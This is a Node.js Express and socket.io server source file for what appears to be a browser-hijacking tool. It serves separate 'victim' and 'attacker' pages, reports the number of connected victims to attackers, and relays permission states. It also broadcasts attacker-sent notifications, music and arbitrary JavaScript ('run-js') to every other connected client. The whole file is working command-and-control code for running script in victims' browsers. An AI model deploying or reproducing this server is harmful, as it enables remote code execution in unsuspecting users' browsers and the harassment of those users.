const express = require('express');
const app = express();
const http = require('http');
const server = http.createServer(app);
const { Server } = require("socket.io");
const io = new Server(server);

app.get('/', (req, res) => {
  res.sendFile(__dirname + '/frontend/victim/index.html');
});
app.get('/v.js', (req, res) => {
  res.sendFile(__dirname + '/frontend/victim/victim.js');
});


app.get('/a', (req, res) => {
  res.sendFile(__dirname + '/frontend/attacker/index.html');
});
app.get('/a/a.js', (req, res) => {
  res.sendFile(__dirname + '/frontend/attacker/attacker.js');
});

let victimConns = 0;
let attackerConns = 0;
let attackerSockets = [];

io.on('connection', (socket) => {
  console.log('a user connected');
  socket.on('disconnect', () => {
    console.log('user disconnected');
    if (role == 'victim') {
      victimConns--;
      attackerSockets.forEach((attackerSocket) => {
        attackerSocket.emit('victims', victimConns);
      });
    }
    else if (role == 'attacker') {
      attackerConns--;
      attackerSockets.forEach((attackerSocket) => {
        attackerSocket.emit('attackers', attackerConns);
      });
    }
  });
  let role = null;
  socket.on('conn', (msg) => {
    role = msg.role;

    if (role == 'attacker') {
      attackerConns++;
      attackerSockets.push(socket);
      socket.emit('victims', victimConns);
      attackerSockets.forEach((attackerSocket) => {
        attackerSocket.emit('attackers', attackerConns);
      });
    }
    else if (role == 'victim') {
      victimConns++;
      attackerSockets.forEach((attackerSocket) => {
        attackerSocket.emit('victims', victimConns);
      });
    }
    attackerSockets.forEach((attackerSocket) => {
      attackerSocket.emit('new-conn', msg);
    });
  });
  socket.on('ping', () => {
    socket.broadcast.emit('ping');
  });
  socket.on('pong', () => {
    attackerSockets.forEach((attackerSocket) => {
      attackerSocket.emit('pong');
    });
  });
  socket.on('permission', (msg) => {
    attackerSockets.forEach((attackerSocket) => {
      attackerSocket.emit('permission', msg);
    });
  });
  socket.on('notification', (msg) => {
    socket.broadcast.emit('notification', msg);
  });
  socket.on('music', (msg) => {
    socket.broadcast.emit('music', msg);
  });
  socket.on('stop-music', () => {
    socket.broadcast.emit('stop-music');
  });
  socket.on('run-js', (msg) => {
    socket.broadcast.emit('run-js', msg);
  });
});

server.listen(3000, () => {
  console.log('listening on *:3000');
});